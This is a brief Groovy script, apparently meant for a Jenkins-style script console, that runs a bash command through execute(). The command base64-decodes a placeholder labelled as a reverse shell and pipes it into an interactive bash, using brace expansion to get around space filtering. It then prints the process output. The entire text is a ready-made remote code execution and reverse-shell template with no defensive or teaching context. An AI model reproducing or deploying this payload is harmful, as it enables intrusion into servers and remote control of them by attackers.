def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,base64reverseshell}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
